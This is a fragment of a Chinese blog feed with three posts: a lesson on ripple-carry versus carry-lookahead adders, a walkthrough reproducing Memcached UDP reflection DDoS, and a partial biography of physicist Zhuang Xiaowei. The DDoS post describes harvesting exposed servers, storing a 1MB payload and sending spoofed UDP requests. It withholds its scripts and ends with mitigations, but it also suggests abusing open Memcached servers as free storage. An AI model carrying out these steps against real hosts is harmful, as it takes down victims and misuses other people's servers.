    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ALU提供的加法，和减法， 就基本都是由加法器来实现的，我们现在学习的加法器，是由一个一个的全加器串连而成，它在性能上存在着很大的问题，而这个问题究竟是什么，我们又该如何解决，下面，我们将来一起探讨这件事情。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/232100048.png" alt=""></p><p>我们还是来看这个四位加法器的例子，在实现中，我们是用四个全加器，构成了这个四位的加法器，我们注意到，当把这个加法器的输入都准备好时， 其实只有最右边的这个全加器的三个输入都准备好了，左边这三个全加器，它的进位输入都还没有产生， 所以实际上只有最右边这个全加器，可以得到正确运算结果，等他将进位的输出，传接到下一个全加器后，下一个全加 器才可以开始运算，进而产生新的进位输出。这样进位输出，像波浪一样，依次从低位到高位传递，这样的加法器，也因此得名为行波进位加法器。它的英文名称也简称为RCA， 这个加法器，从结构上来看，低位全加器进位输出，都连接到高一位全加器的进位输入， 它的优点是电路布局简单，设计方便，我们只要设计好了全加器，连接起来就构成了多位的加法器。但这缺点也很明显，也就是高位的运算必须等待低位的运算完成， 这样造成了整个加法器的延迟时间很长。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/232219362.png" alt=""></p><p>因此，我们要来分析一下，这个行波进位加法器延迟的情况。我们还是以四位的形波进位加法器为例，我们把构成这个加法器的四个全加器，内部结构打开，每个全加器个进位输出连接到下一个全加器的进位输入，因此，我们现在看到的就是一个四位的形波进位加法器的门电路的实现。要对一个电路的性能进行分析，我们就要找出其中的最长路径。也就是找出所有的从输入到输出的电路连接中，经过的门数最多的那一条，经过分析，我们可以发现，实际上红色标明的这条路径，就是这个加法器延迟最长的路径，也被称为关键路径。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/232327543.png" alt=""></p><p>我们来做一个简单的分析， 对于最低位的全加器，它在A、B和Cin都已经准备好，其实，输入信号进入到这块电路之后，在连接线上传递需要花时间。称为线延迟，而经过这样的门，也需要花时间，称为门延迟。在进行设计原理分析时，我们主要关注门延迟。</p><p>因此从这条通路来看，产生第一个s输出，需要通过两个门的延迟。所以它显然不是最长的路径，因为往下，这里还会经过一个门， 然后再经过一个门，要经过三个门，才会产生这个全加器的进位输出， 当然我们还要注意，为什么是从这里来，而不是从这个与门的另一个输入，我们可以发现，这个与门的另一个输入，直接连接了Cin，所以它不如从上面来的这条路径更长。当然，从A出发或着从B出发都是一样的，所以对于第一个全加器，它的最长路径，是这一条。然后进入第二个全加器，那么等传递到这个与门的时候，我们会发现，这个与门下面这个输入，经过了三级门才到达。而上一个输入，只要经过一级门就到达了， 所以显然最长路径需要从下面这条通路开始计算的。然后，在这个全加器中，经过两个逻辑门，产生了进位输出，</p><p>依次往下传递，在每一个全加器中，都经过了两个逻辑门，最后产生了进位输出。我们要注意，在这个进位输出产生时，所有的全加器的S都已经产生了。</p><p>即使最晚产生的这个S，也比这个Cout早了一级门，那如果我们把每一个门延迟都记为T的话，首先在每个全加器内部，都要经过2T个延迟，然后还要加上最开始的这一个门延迟，因此我们就可以计算出，总门延迟时间就是2T乘以全加器的数量，在加上1T。对于四位的形波进位加法器，一共是九个门延迟， 那如果是N位的形波进位加法器那就一共是2N+1个门延迟，</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/232546006.png" alt=""></p><p>这样对于32位的形波进位加法器来说，N就等于32，所以一共是65个门延迟。那65个门延迟，到底代表着什么呢?</p><p>这样看起来还是太抽象了，我们选一个大家熟悉的物品，有一些感性的认识。</p><p>比如说一款著名的智能手机，它内部的CPU，采用着28nm的制造工艺，主频是1.3GHz，也就是时钟周期0.66ns，这就是最近的两个时钟上升延之间的时间长度，因为加法器的输入是来自寄存器，而且加法器的输出，包括运算的和，和进位输出， 都是要传递到寄存器保存起来。所以说这些信号从前一级的寄存器，经过加法器的所有逻辑，一直到下一级寄存器的输入，不能超过0.66ns，那实际情况又是怎么样的呢?</p><p>对于一个32位的形波进位加法器， 如果采用28nm的制造工艺，没延迟大约为0.02ns，因为总共需要65个门的延迟，所以一共需要1.3ns， 这远远超过了我们所要求的0.66ns，采用这样的加法器，它的主时钟频率，最多也只能达到769MHz，</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/232652972.png" alt="mark"></p><p>这里，我们都还没有考虑寄存器的建立保持时间， 还有连线的延迟。实际的频率只会比这个更低，所以说，这样的加法器，与我们现实中实际使用的加法器，性能差距是非常大的。</p><p>那我们应该如何进行优化呢?</p><p>首先，还是要分析一下这个加法器的问题所在，影响性能的核心问题，就在于高位的运算，必须要等待低位的进位输出讯号</p><p>那我们是否可以提前计算出这些进位信号，以提高性能呢?</p><p>那我们就对进位输出信号，进行重点的分析，它的进位输出信号记为Ci+1，Ci+1可以通过这样的逻辑表达式计算出来，它的意思就是，如果这个全加器的三个输入， Ai，Bi或着Ci，只要任义其中两个为一，则进位就是1，这是很自然的，三个一位的二进制数相加，有两个或着两个以上的1，则自然会产生进位。我们再将这个算式当中的Ci提取出来，就可以得到这样一个表达式。</p><p>在这个表达式当中，Ai和Bi都是在运算之初就是确定的，所以为了表达的简便，我们再设定两个信号，一个称为Gi，它就等于Ai和Bi的与，另一个是Pi，它就等于Ai和Bi的或，这样将Gi和Pi，代入到这个算式当中，就得到了一个更为简化的算式。我们只需要记住的是，Pi和Gi是由Ai和Bi产生的，他们都是在运算之初，就可以确定了的信号。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/232821571.png" alt="mark"></p><p>那么通过这样一个通用的表达式，我们来看，每一个进位输出讯号，是如何计算出来的。</p><p>首先，C1是通过G0、P0和C0计算出来的，那么在运算之初，G0和P0都是已知的，C0也是已知的。所以C1不用进行任何的等待，直接就可以计算出来， 而Ci，是由G1、P1和C1运算而得的。</p><p>在这里G和P都是已知的， 但是C1不是这个加法器的直接输入，但如果我们想提前计算出C2，我们可以将上一个算式，代入到这个算式当中。也就是C1转换成上一个算式，我们再将这个算式展开，除了G和P之外，只有C0，所有的信号都是在运算之初就可以确定的，这样，我们就不用等待最低位的全加器产生C1，而是通过整个加法器的输入，直接计算出C2。</p><p>与之类似，原本C3也要等待C2的运算，那么现在将C2这个算式带进来，变成这样，然后再进行展开。展开后的算式中，除了G和P也只有C0，所以所有的信号也都是在运算之初就可以确定的了。同样，我们还可以得到C4，越高位的进位输出信号，就越复杂。但是我们可以看到，C4的算式当中，除了G和P之外，也只有C0</p><p>所以它也不用依赖低位的进位信号，通过这样的转换， 我们就有了提前计算所有的进位输出信号的方法。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/233055909.png" alt="mark"></p><p>那它在硬件上是如何实现的呢？我们以C4为例，</p><p>我们将刚才C4的这个表达式写成竖排的形式，它对应的硬件电路是这样的，</p><p>我们可以看到，最外层一共有五组元素进行 或运算，对应了最后的这个五数字的或门。而其中第一个元素是G3，G3就是A3和B3的与， 所以在这里我们可以看到，A3和B3经过了一个与门，与门的输出直接连到了最后的这个或门上。</p><p>第二个元素是P3和G2的与， 它就对应了这个与门，其中一个输入是P3，而P3是A3和B3的或。另一个输入是G2， G2是A2和B2的与。</p><p>再往下看，第三组元素对应了这个3输入的与门。</p><p>第一个输入是P3，来自于这里。</p><p>第二个输入是P2，来自这里。第三个输入是G1，来自这里。</p><p>好，依此类推，就可以达到第四组元素，第五组元素。</p><p>这样我们就可以发现C4只需要通过A，B和C0就可以计算出来，而且计算C4的延迟只需要三级门，这是一级，这是第二级，这是第三级。其实由此类推，计算任意一级的进位输出都只需要三级门延迟，与加法器的位数无关。但只是如果进一步拓宽加法器的位数，像这样最后的算式 会变得越来越长，对应的电路就会变得越来越复杂。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/233226581.png" alt=""></p><p>那先不谈这个缺点，至少我们有了提前计算进位输出的方法， 用这样的方法实现了加法器就被称为超前进位加法器。它的英文缩写也可以写成CLA。这就是一个四位的超前进位加法器。它仍然由四个全加器构成，但是每个全加器的进位输入并不来自于前一级的全加器，而是来自一个统一的逻辑，这就是刚才我们展示的超前进位的逻辑。对于每一个进位，其实都只需要三级门延迟就可以计算出来。然后进入到全加器当中，还需要经过一级门延迟才可以计算出对应的S信号。因此，对于超前进位加法器总的延迟时间为4级的门延迟。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/233348856.png" alt=""></p><p>而四位的行波进位加法器总延迟时间为9级的门延迟。这个性能的提升就是非常可观的。而且更为重要的是超前进位加法器它的门延迟与加法的位宽是没有关系的。所以对于32位的加法器如果采用行波进位的方式，我们已经分析过需要65级的门延迟，那如果采用超前进位的方式，理想情况下也只需要四级的门延迟，但可惜的是，这也只是一个理想。因为要实现32位的完全的超前进位，电路就会变得非常的复杂。我们可以看一看C31的超前进位的表达式就会变成这个样子。也许这样就需要32输入的与门和32输入的或门。这个在实现上就不太可行了。</p><p>因此通常的实现方法，是采用多个小规模的超前进位加法器拼接而成一个较大的加法器，比如说，要生成一个32位的加法器，我们可以先做一个8位的超前进位加法器，然后将四个八位的超前进位加法器用行波进位的方式连接起来，从而构成一个32位的加法器。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180730/233521952.png" alt=""></p><p>那么这样分析，一个32位的行波进位加法器它的门延迟是1.3个ns，而一个超前进位加法器只需要0.08个ns，也就是四级门延迟。如果我们采用四个超前进位加法器拼接成一个32位的加法器，那也只需要0.26ns。这个0.26ns是怎么算出来的呢？每个CLA有三级门延迟，四个就有十二个门延迟，加上最后一级全加器一共需要十三个门延迟，也就是0.26ns。那么因为这个加法器的关键路径是0.26ns，那么它就可以运行在3.84GHz的时钟频率下，那么至少它就不会成为我们整个复杂的CPU设计的关键路径，不会降低整个芯片的使用频率了。</p><p>这个经过改进的加法器，不仅功能正确，而且在性能和可实现性两个方面达到了比较好的平衡。那现在把它和之前实现的逻辑运算部件整合在一起，就构成了一个ALU可以提供基本的算术运算和逻辑运算的功能了。</p><h2 id="课程链接-华文慕课"><a href="#课程链接-华文慕课" class="headerlink" title="课程链接:华文慕课"></a>课程链接:<a href="http://www.chinesemooc.org/course.php?ac=course_view&amp;id=685395&amp;eid=23555&amp;key=0" target="_blank" rel="noopener">华文慕课</a></h2><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2018/07/30/ComputerOrganizationandDesign-adder/" title="【计算机组成与设计】加法器的优化">【计算机组成与设计】加法器的优化</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2018/07/30/ComputerOrganizationandDesign-adder/" title="【计算机组成与设计】加法器的优化">http://blog.rookiehacker.org/2018/07/30/ComputerOrganizationandDesign-adder/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      计算机组成，加法器的优化部分
    
    </summary>
    
      <category term="计算机组成原理" scheme="http://blog.rookiehacker.org/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="计算机组成" scheme="http://blog.rookiehacker.org/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"/>
    
  </entry>
  
  <entry>
    <title>【DRDos攻击】基于Memcached的DRDos的研究与攻击复现</title>
    <link href="http://blog.rookiehacker.org/2018/03/12/memcacheddrdos/"/>
    <id>http://blog.rookiehacker.org/2018/03/12/memcacheddrdos/</id>
    <published>2018-03-11T22:33:10.000Z</published>
    <updated>2018-03-12T12:10:52.195Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>【声明】本文仅作学习研究之用，欢迎一起探讨，请勿发动恶意攻击，否则后果自负！</p><h1 id="核弹级DDoS攻击肆掠全球"><a href="#核弹级DDoS攻击肆掠全球" class="headerlink" title="核弹级DDoS攻击肆掠全球"></a>核弹级DDoS攻击肆掠全球</h1><p>进入3月，春天到了，万物复苏，<del><em>又到了动物交配的季节！</em></del>咦！不对不对，我要说什么来着。。O(∩_∩)O哈哈~皮这么一下确实很好玩哦 (<strong>^▽^</strong>)) 下面咱们说说正事，自从进入三月份啊，爆炸性的新闻就不断啊！先是<a href="https://yq.aliyun.com/articles/503688" target="_blank" rel="noopener">阿里云爆出成功监控和防御一起流量高达758.6Gbps的Memcached DDoS反射攻击</a><br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/190324149.png" alt=""><br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/190416426.png" alt=""><br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/190537558.png" alt=""></p><p>接着全球最大的同性交友网站<del>Gayhub</del>Github也宣称自己遭遇<a href="https://www.baidu.com/link?url=c3QSt9dznjgssORDjqWuCthbw5KFsj1tR-YxKsInoLtzNQSpjn_DL7tDrTWyFyXXWn76rWJlj0Wn7ZNuj-PToxBIU5-hHbZimnDcAaonIj7&amp;wd=&amp;eqid=afb7731c0004e794000000035aa62502" target="_blank" rel="noopener">有史以来最大的DDoS攻击</a>，在2月28日的17:21-17:26之间，GitHub网站无法正常访问。从17:26-17:30，网站只能间歇性的可以访问。简单说，这10分钟该网站已处于瘫痪状态。二者遭遇的新型DDos皆是利用Memcache作为DRDoS放大器，这种反射性DDos能够利用很少的计算资源反射出巨大的流量，破坏力强大<br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/191205963.png" alt=""><br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/191228773.png" alt=""></p><p>通过Memcached型反射型DDoS攻击的抓包样本，从UDP协议+源端口11211的特征，可以快速分辨这种攻击类型。</p><h1 id="什么是DRDos"><a href="#什么是DRDos" class="headerlink" title="什么是DRDos?"></a>什么是DRDos?</h1><p>DDos相信大家都知道是什么，但是DRDos可能有些人还是第一次听说，那么什么是DRDos呢？<br>DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。<br>黑客往往会选择那些响应包远大于请求包的服务来利用，这样才可以以较小的流量换取更大的流量，获得几倍甚至几十倍的放大效果。一般来说，可以被利用来做放大反射攻击的服务包括DNS服务、NTP服务、SSDP服务、Chargen服务、Memcached等。</p><p>————<em>来自百度</em></p><h1 id="什么是Memcached？"><a href="#什么是Memcached？" class="headerlink" title="什么是Memcached？"></a>什么是Memcached？</h1><p><a href="https://baike.baidu.com/item/memcached/1625373?fr=aladdin" target="_blank" rel="noopener">Memcached</a> 是一个高性能的分布式内存对象缓存系统，用于动态Web应用以减轻数据库负载。它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程（daemon ）是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。</p><p>————<em>来自百度</em></p><p>简单点理解呢，就是它是一个简洁的key-value存储系统。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。那么如何利用Memcached来DRDos呢？请看下面。</p><h1 id="Memcached的放大攻击原理"><a href="#Memcached的放大攻击原理" class="headerlink" title="Memcached的放大攻击原理"></a>Memcached的放大攻击原理</h1><p>从协议上看，Memcached运行在11211端口，支持TCP与UDP协议，也就是我们可以使用这两种协议来与Memcached主机通信，这也为我们伪造数据包提供了机会。学习过计算机网络的都知道，TCP是面向连接的，经过三次握手与服务器建立连接，能重传，提供可靠的服务，而UDP是无连接的不需要事先与服务器建立连接，提供不可靠的服务，不需要进行三次握手。同时服务器接收方也无法验证客户源IP。因此我们可以通过发送源地址为被攻击主机IP的数据包来将Memcached服务器返回的包发现被攻击主机，从而达到反射攻击的目的。还有一点，由于Memcached系统支持最大键值单数据对1M存储。所以我们最大只能存储1M，当然你可以作多个字段，这样也会放大。这里我们将使用TCP来上传我们的攻击载荷，使用UDP构造请求来发起攻击。<br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/190937475.png" alt=""></p><p>Memcached有如下一些命令和操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Memcached 存储命令</span><br><span class="line"> Memcached set 命令</span><br><span class="line"> Memcached add 命令</span><br><span class="line"> Memcached replace 命令</span><br><span class="line"> Memcached append 命令</span><br><span class="line"> Memcached prepend 命令</span><br><span class="line"> Memcached CAS 命令</span><br><span class="line"> Memcached 查找命令</span><br><span class="line"> Memcached get 命令</span><br><span class="line"> Memcached gets 命令</span><br><span class="line"> Memcached delete 命令</span><br><span class="line"> Memcached incr/decr 命令</span><br><span class="line"> Memcached 统计命令</span><br><span class="line"> Memcached stats 命令</span><br><span class="line"> Memcached stats items 命令</span><br><span class="line"> Memcached stats slabs 命令</span><br><span class="line"> Memcached stats sizes 命令</span><br><span class="line"> Memcached flush_all 命令</span><br></pre></td></tr></table></figure></p><p>这里我们主要用到的是这四个：<code>set</code>、<code>get</code>、<code>delete</code>、<code>quit</code>。<br><code>set</code>用于将攻击载荷上传到Memcached服务器，<code>get</code>用于UDP包请求我们存的攻击载荷，<code>delete</code>用于删除攻击载荷，<code>quit</code>则用来退出服务。</p><h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="获取Memcached主机信息"><a href="#获取Memcached主机信息" class="headerlink" title="获取Memcached主机信息"></a>获取Memcached主机信息</h2><p>通过shodan或者Zoomeye我们能够获取Memcached的主机信息情况，或者你有精力的话也可以扫一扫全网啊~看一看有木有11211开放的主机存在。。这里我直接通过脚本拿到了1w IP（多了不敢拿啊。。），但是其中可以用来发起攻击的估计只有很少一部分吧（因为自从攻击事件发生后很多服务器都做了相应的防护策略。。）。<br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/191630607.png" alt="大约有50多万太主机运行着Memcached服务"></p><p>获取IP的脚本很简单，我就不发了（不敢发啊~），有兴趣的童鞋可以自己写一写（<em>搜一搜</em>）。。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/192129539.png" alt=""></p><h2 id="上传攻击载荷"><a href="#上传攻击载荷" class="headerlink" title="上传攻击载荷"></a>上传攻击载荷</h2><p>这里我们使用python脚本，利用socket来发起一个TCP连接，上传一个1M大小（Memcached最大支持1M的键值数据）的载荷。载荷上传成功后Memcached服务器会回显<code>STORED</code>消息，因为我们可以利用这个来确定我们的载荷是否上传成功。同样我们也可以使用telnet连接Memcached服务器，直接<code>get xxx(你上传的key的名称)</code>来验证载荷是否成功上传。<br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/192006775.png" alt=""></p><p>上传的脚本很简单，我就不发了（不敢发啊~），有兴趣的童鞋可以自己写一写（<em>搜一搜</em>）。。</p><h2 id="发送伪造IP的UDP包"><a href="#发送伪造IP的UDP包" class="headerlink" title="发送伪造IP的UDP包"></a>发送伪造IP的UDP包</h2><p>这里我们使用了python的scapy来伪造UDP包向Memcached服务器发送请求查询我们存储的key，这样Memcached服务器返回的数据就被指向了我们要攻击的IP（这里我选择了我的本地地址。。），当然为了结果更加明显，你也可以利用多线程控制更多服务器数量或者干脆多发几个包。。。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/192239111.png" alt=""></p><p>发送的脚本很简单，我就不发了（不敢发啊~），有兴趣的童鞋可以自己写一写（<em>搜一搜</em>）。。</p><h2 id="监听查看返回结果"><a href="#监听查看返回结果" class="headerlink" title="监听查看返回结果"></a>监听查看返回结果</h2><p>我直接将被攻击IP（UDP数据包中的源IP地址）设置为了我的本地地址，端口12345，打开控制台，直接<code>nc -l -u -p 12345</code>监听一下，可以看到，Memcached服务器返回的数据正源源不断地发来~可以试想一下，我们发出区区20字节的数据包，却可以返回高达1M的数据，1M/20=52100倍，再加上数十万Memcached服务器的存在，这要是打起来，这酸爽~我啥也不说了，自行体会吧。</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/192455965.png" alt=""></p><p>最后删除载荷并退出（保持好习惯~）</p><p><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180312/192419498.png" alt=""></p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><h2 id="如何避免被利用成为Memcached反射端"><a href="#如何避免被利用成为Memcached反射端" class="headerlink" title="如何避免被利用成为Memcached反射端"></a>如何避免被利用成为Memcached反射端</h2><p>建议对运行的Memccached服务进行安全检查和加固，防止被黑客利用发起DDoS攻击造成不必要的带宽流量；<br>如果您的Memcached版本低于1.5.6，且不需要监听UDP。您可以重新启动Memcached加入 -U 0启动参数，例如：Memcached -U 0，禁止监听在udp协议上</p><h2 id="如何防护Memcached-DDoS反射攻击"><a href="#如何防护Memcached-DDoS反射攻击" class="headerlink" title="如何防护Memcached DDoS反射攻击"></a>如何防护Memcached DDoS反射攻击</h2><p>建议优化业务架构，将业务分散到多个IP上，或者购买网络产品服务商提供的安防服务。</p><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><p>在看大佬们的资料的时候发现十分好玩的一个东西，就是利用Memcached的开放服务特性，我们可以利用Memcached服务器来存储我们的一些不是那么重要的东西啊，毕竟这存储资源free啊，不好好利用多么浪费啊~</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://yq.aliyun.com/articles/503688" target="_blank" rel="noopener">758.6G每秒：阿里云成功防御国内最大规模Memcached DDoS反射攻击</a></p><p><a href="https://www.baidu.com/link?url=c3QSt9dznjgssORDjqWuCthbw5KFsj1tR-YxKsInoLtzNQSpjn_DL7tDrTWyFyXXWn76rWJlj0Wn7ZNuj-PToxBIU5-hHbZimnDcAaonIj7&amp;wd=&amp;eqid=afb7731c0004e794000000035aa62502" target="_blank" rel="noopener">史上首个核弹级DDoS攻击肆掠全球 GitHub遭1.35T级流量攻击</a></p><p><a href="http://blog.csdn.net/microzone/article/details/79262549?from=groupmessage&amp;isappinstalled=0" target="_blank" rel="noopener">基于Memcached分布式系统DRDoS拒绝服务攻击技术研究</a></p><h1 id="欢迎加入我的tg群组"><a href="#欢迎加入我的tg群组" class="headerlink" title="欢迎加入我的tg群组"></a><em>欢迎加入我的tg群组</em></h1><p>为什么选择tg就不多说了，下面是邀请链接，直接扫码吧！<br><img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180303/151318226.png" alt="扫码加入我的telegram群组"></p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2018/03/12/memcacheddrdos/" title="【DRDos攻击】基于Memcached的DRDos的研究与攻击复现">【DRDos攻击】基于Memcached的DRDos的研究与攻击复现</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2018/03/12/memcacheddrdos/" title="【DRDos攻击】基于Memcached的DRDos的研究与攻击复现">http://blog.rookiehacker.org/2018/03/12/memcacheddrdos/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      近日关于Memcached的DRDos攻击搞得是风生水起，于是学习了一下相关知识，分享一下~
    
    </summary>
    
      <category term="DDos攻击" scheme="http://blog.rookiehacker.org/categories/DDos%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="Memcached" scheme="http://blog.rookiehacker.org/tags/Memcached/"/>
    
      <category term="DRDos" scheme="http://blog.rookiehacker.org/tags/DRDos/"/>
    
      <category term="DDos" scheme="http://blog.rookiehacker.org/tags/DDos/"/>
    
  </entry>
  
  <entry>
    <title>【励志人物】两位距离诺奖很近的华人</title>
    <link href="http://blog.rookiehacker.org/2018/03/06/Inspirationalpeople/"/>
    <id>http://blog.rookiehacker.org/2018/03/06/Inspirationalpeople/</id>
    <published>2018-03-06T12:35:10.000Z</published>
    <updated>2018-03-06T13:25:46.255Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://www.170mv.com/kw/other.web.rr01.sycdn.kuwo.cn/resource/n3/61/69/690380478.mp3"></iframe><p>作者：公子大白0m0<br>链接：<a href="https://www.zhihu.com/question/36037775/answer/125333556" target="_blank" rel="noopener">https://www.zhihu.com/question/36037775/answer/125333556</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><h1 id="第一个是庄小威。"><a href="#第一个是庄小威。" class="headerlink" title="第一个是庄小威。"></a>第一个是庄小威。</h1><p>她距离2014年诺贝尔化学奖非常近。<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/210941948.png" alt="">左数第二个前言2014年的诺贝尔奖，颁发给了三个欧美的老爷们。但是，这里面好像忘了一个人。这个人是个刚刚四十多的人，是个美籍华人，是个女人。庄小威出生在江苏。但是她没有这个地方女性在历史上久负盛名的温婉，取而代之的是花木兰一样的豪爽和英气。书桌边，父亲正在教一个小男孩物理。父亲问：“一杯水放在桌子上，这个水杯受了多少力？”这是一个普通的初中物理问题。“有水和水杯的重力，桌子还有个支持力。”男孩说。“你还能不能想出来其他的力？”父亲问。“没错啊，就这两个力，一平衡它就不动了。”男孩答。一旁的妹妹在玩，没仔细地听，却插了一句嘴：“空气对水杯还有个作用力。”父亲大喜，道：“这孩子尚未上学，竟有几分学物理的天分。”其实，长大后小女孩已不记得当时她是否真的知道空气是什么，只是因为父亲是空气动力学教授，猜到提出的问题肯定跟空气有关，于是就这么作答。这位小女孩就是庄小威，日后她不仅踏进了物理学的殿堂，而且成长为美国科学院现在最年轻的院士。<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/211018608.png" alt=""></p><h2 id="一、-庄家有女初长成"><a href="#一、-庄家有女初长成" class="headerlink" title="一、 庄家有女初长成"></a>一、 庄家有女初长成</h2><p>庄小威出生在一个科学家家庭。她的父亲庄礼贤和母亲朱仁芝都是中国科技大学工程科学院的教授，父亲是教空气动力学的，曾经写过一本经典的《流体力学》在国内流传。小时候庄小威住在江苏如皋的爷爷奶奶家，没上过幼儿园，自然也就没有幼儿园毕业证。5岁她才回到自己父母身边，认字什么的都是爸妈在工作之余随便教的。到了年纪，就上了中科大附小二年级。从小啊庄小威就展现了学霸潜质，5岁开始就自己学做菜，自己打扫卫生。我想想我五岁的时候在干啥……好像还在幼儿园里哭鼻子因为拉裤子了……然后就是一帆风顺了，初中开始她就上的中科大少年班预备班，从合肥到北京再到苏州，小威一路过关斩将高考600多分就进了少年班。那时候的中科大校长是朱清时，他今年快70了还记得这个小姑娘。刚进中科大的时候，小威还是一头短发（当然现在也是短发……），但是她却有两个超人的本领。一个本领是怎么看书眼睛都是1.5，一个本领是可以一边听评书一边写原子物理作业。你上学的时候干过听歌写作业的事吗？反正我是不行。小威和我一样，痛恨死记硬背。还记得我高中会考的时候为了背历史一整天不停背把自己都背晕菜了，吃晚饭的时候跟喝醉酒了似的。她打小便被物理学的严谨推理之美所吸引，我也是打小便被生物学的生龙活虎所吸引~~小威在中科大人称学霸威，因为她几乎所有知识都能随口道来，一不小心就把四大力学考了个满分。这个纪录至今没人能打破。四大力学是啥？《理论力学》、《电动力学》、《量子力学》和《热力学、统计物理》。估计学物理的都知道。但是么……呵呵。之后又是一路顺风顺水，学霸的科研路怎么会不顺？庄小威可是从小立志就要成为科学家的人啊！中科大毕业就到了加州伯克利分校，杨振宁建议她学实验物理，因为杨振宁自己是搞理论物理的，自己提出的理论还要靠别人验证这个感觉肯定不太好。所以小威就选择了实验物理，很快就喜欢上了光学。上帝说，要有光。于是就有了庄小威。她一不小心又拿到了伯克利分校的博士，这时候，就该考虑找工作的事了。<img src="http://ojzr7go2m.bkt.clouddn.com/blog/20180306/211051747.png" alt="朱棣文"></p><h2 id="二、学霸也有伤心事"><a href="#二、学霸也有伤心事" class="headerlink" 